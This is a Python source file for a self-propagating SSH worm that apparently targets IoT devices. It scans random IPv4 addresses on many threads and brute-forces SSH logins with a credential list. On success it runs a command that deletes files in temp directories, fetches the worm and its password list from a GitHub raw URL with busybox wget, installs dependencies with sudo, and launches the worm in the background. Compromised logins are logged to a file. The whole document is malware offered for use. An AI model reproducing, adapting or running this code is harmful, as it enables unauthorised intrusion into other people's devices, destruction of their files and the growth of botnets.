import paramiko,random,threading

user = []
session = []

def brute_ssh(target,nulled):
    global user,session
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for got_c in user:
      c=got_c.split(' ')
      username = c[0]
      password = c[1]
      try:
       ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
       ssh.connect(target, username=username, password=password, timeout=3)
       if f'{target} {username}:{password}' not in session:
        print(f"{target} {username}:{password} NEW SESSION ID={nulled} . . .")
        Exception(ssh)
        session.append(f'{target} {username}:{password}')
       break
      except paramiko.AuthenticationException:
       print(f'FAILED {target} {username}:{password} ID={nulled}')
      except paramiko.SSHException:
       pass
      except:
       pass

def Execute(sshConnection):
    sshConnection.exec_command("cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; busybox wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/ioT2.txt; busybox wget https://raw.githubusercontent.com/Hex1629/nulled_project.py/main/worm.py; sudo apt -y install python3-pip; sudo apt-get -y install python-paramiko; sudo apt-get -y install python-netifaces; chmod a+x worm.py; chmod a+x ioT2.txt; python3 worm.py\r\n")
    sftpClient = sshConnection.open_sftp()
    stdin, stdout, stderr = sshConnection.exec_command("mkdir /tmp/worm")
    stdout.channel.recv_exit_status()  # Blocking call
    sftpClient.put("./worm.py", "/tmp/worm/" + "./worm.py")
    sftpClient.put("./ioT2.txt", "/tmp/worm/" + "./ioT2.txt")
    stdin, stdout, stderr = sshConnection.exec_command("sudo apt -y install python3-pip")
    stdout.channel.recv_exit_status()
    stdin, stdout, stderr = sshConnection.exec_command("sudo apt-get -y install python-paramiko")
    stdout.channel.recv_exit_status()
    stdin, stdout, stderr = sshConnection.exec_command("sudo apt-get -y install python-netifaces")
    stdout.channel.recv_exit_status()
    stdin, stdout, stderr = sshConnection.exec_command("chmod a+x /tmp/worm/" + "worm.py")
    stdout.channel.recv_exit_status()
    stdin, stdout, stderr = sshConnection.exec_command("nohup python /tmp/worm/" + "worm.py" + " &")
    stdout.channel.recv_exit_status()

def got_list(FILES):
  global user
  try:
   with open(FILES,'r') as f:
     d = f.readlines()
     for o in d:
      try:
       ioT = o.replace('\n','').split(' ')
       got = f'{ioT[0]} {ioT[1]}'
       if got not in user:
        user.append(got)
      except:
       pass
   return True
  except:
   return None

if got_list('ioT2.txt') != None:
 print(f"{len(user)} YES [ SCANNING ] . . .")
else:
 print("FAILED")

lst = []

def find_ioT():
 global lst
 c = 0
 for _ in range(250):
  ip = f'{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'
  if ip not in lst:
   lst.append(ip)
   c = 1
  else:
   c = 0
  if c == 1:
   threading.Thread(target=brute_ssh,args=(ip,len(lst))).start()
 threading.Thread(target=find_ioT).start()
threading.Thread(target=find_ioT).start()

def print_lower():
 global session
 s = []
 while True:
  if len(session) != 0:
   for d in session:
    if d not in s:
      s.append(d)
      with open('IOT_infection.txt','a') as f:
       f.write(f'{d}\n')
threading.Thread(target=print_lower).start()